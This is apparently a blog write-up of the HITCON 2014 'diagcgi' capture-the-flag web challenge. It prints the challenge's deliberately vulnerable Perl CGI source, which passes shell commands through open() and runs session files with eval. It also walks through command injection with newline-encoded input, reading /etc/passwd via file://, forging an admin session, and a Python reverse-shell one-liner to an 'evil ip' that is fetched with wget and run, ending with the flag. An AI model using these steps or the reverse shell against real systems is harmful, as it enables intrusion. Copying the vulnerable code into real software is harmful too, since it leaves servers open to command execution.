---
layout: post
title: "HITCON 2014 diagcgi Writeup"
date: 2014-08-27 22:40:17 +0430
comments: true
categories: 
---
diagcgi was web challange based on perl language and cgi web programming
i scanned the target with Acunetix and scanner found that local file inclusion(somehow but not exactly) which we colud read /etc/passwd file with it with this command in curl 
<!--more-->
file:///etc/passwd .
reading this file found a clue key:x:1001:1001::/home/key: , with this tried to read /home/key or list its files if it was directory but nothing achived.
also we could excute command by curl for example %0alocate%20key%0a and it gave us lot of information 1. ~/key.txt 2. read_key but we coludnt run or read them  
after it tried to read source of cgi script 

```perl
#!/usr/bin/perl -w

use CGI;
use Digest::MD5 qw(md5_hex);

$cgi = new CGI;
$SESSDIR = "/tmp/";
$sessfile = $cgi->cookie("diagsess");
$arg0 = $cgi->param("arg");
$action = $cgi->param("action");
$arg = &safestr($arg0);

if (! defined($sessfile) )
{
    if ( md5_hex($cgi->param("sechash")) =~ /^000000000000.*$/)
    {
        $sesshash{'user'} = 'admin';
    }
    else
    {
        $sesshash{'user'}  = 'guest';
    }
    $sesshash{'ip'} = &get_ip;

    $diagsess = md5_hex( $sesshash{'user'} . '|||' . $sesshash{'ip'} );
    $cookie = "diagsess=$diagsess;";
    &write_session;
    print $cgi->header(-cookie => $cookie,
            -expires => 'Mon, 01 Jan 1999 00:00:00 GMT',
            -'cache-control' => 'no-cache',
            -pragma => 'no-cache',-'location'=> 'dana-na.cgi?sechash=' );

    exit 0;
}
else
{
    print $cgi->header();
    &read_session;
    &print_menu;
}
if (defined ($action) && length($action)>0)
{
    if ($action =~ /^print_session$/)
    {
        &print_session;
        exit 0;
    }
    if ($action =~ /^curl$/)
    {
        &curl($arg);
        exit 0;
    }
    if ($action =~ /^ping$/ )
    {
        &ping($arg);
        exit 0;
    }
    if ($action =~ /^traceroute$/)
    {
        &traceroute ($arg);
        exit 0;
    }
    if ($action =~ /^shell$/)
    {
        &shell($arg);
        exit 0;
    }

}

sub curl
{
    $host = shift;
    print "<pre><textarea rows=24 cols=80>";
    if (defined($host) && length($host)>1)
    {
        open(GG,"/usr/bin/curl -s $host |") and do
        {
            while(<GG>)
            {
                print;
            }
        }
    }
}

sub ping
{
    my $host = shift;
    print "<pre>";
    if(defined($host) && length($host)>1)
    {
        open(GG,"/bin/ping -c3 $host |") and do
        {
            while(<GG>)
            {

                print;
            }

        };
        close GG;

    }
}

sub traceroute
{
    my $host = shift;
    print "<pre>";
    if(defined($host) && length($host)>1)
    {
        open(GG,"/usr/sbin/traceroute -d -n -w 5 $host |") and do
        {
            while(<GG>)
            {
                print;
            }

        };
        close GG;
    }
}

sub read_session
{
    undef %sesshash;
    if(! -f "$SESSDIR/$sessfile")
    {
        print "session error!";
        return;
    }
    open(GG, "$SESSDIR/$sessfile") and do {
        while (<GG>) {
            eval($_);
        }
        close GG;
    };
}

sub write_session
{
    open(GG, ">$SESSDIR/$diagsess") and do
    {
        foreach (sort keys %sesshash)
        {
            print GG "\$sesshash{'$_'} = '$sesshash{$_}';\n";
        }
    };
    close GG;
}

sub print_session
{
    foreach (sort keys %sesshash) {
        print "$_=$sesshash{$_}\n";
    }
}

sub shell
{
    $cmd = shift;
    print "<pre>";
    if (  $sesshash{'user'} eq 'admin' )
    {
        open(GG, "$cmd |") and do
        {
            print;
        };
    }
    else
    {
        print "sorry $sesshash{'user'}! you're not admin!\n";

    }
}

sub print_menu
{
    $arg0 =~ s/\</\<\;/g;
    open(GG,"cat menu.html |") and do
    {
        while(<GG>)
        {
            $_ =~ s/\%\%arg\%\%/$arg0/g;
            print $_;
        }
        close GG;
    };
}

sub get_ip
{
    $h1 = $ENV{'REMOTE_ADDR'};
    $h2 = $ENV{'HTTP_CLIENT_IP'};
    $h3 = $ENV{'HTTP_X_FORWARDED_FOR'};

    if (length($h3)>0)
    {
        return $h3;
    }
    elsif (length($h2)>0)
    {
        return $h2;
    }
    else
    {
        return $h1;
    }
    return "UNKNOWN";
}

sub safestr
{
    my $str = shift;

    $str =~  s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;;
    return $str;

}
```

helped us too much for filtering our ideas specialty these codes 

```perl
$SESSDIR = "/tmp/";
$sessfile = $cgi->cookie("diagsess");
``` 

we found that our sessions created in /tmp/ourcookie and ourcookie was it : md5(admin or guest||| our ip) , we tried to make a session file and we could make it and became member
and executed command by admin access but nothing happend :(
after these ways we tried to spawn shell from server of challange and we could 

```python
#!/usr/bin/python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("evil ip",evil port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

we uploaded this code on a server and WGET it on challange server and then ran it ( with %0a and %20 and urlencode we colud wget it and ran it ) 
challange server coonected to our evil server and we could run read_key for reading flag :)

flag was :

```perl
HITCON{a755be06b165ed8fc4710d3544fce942}
```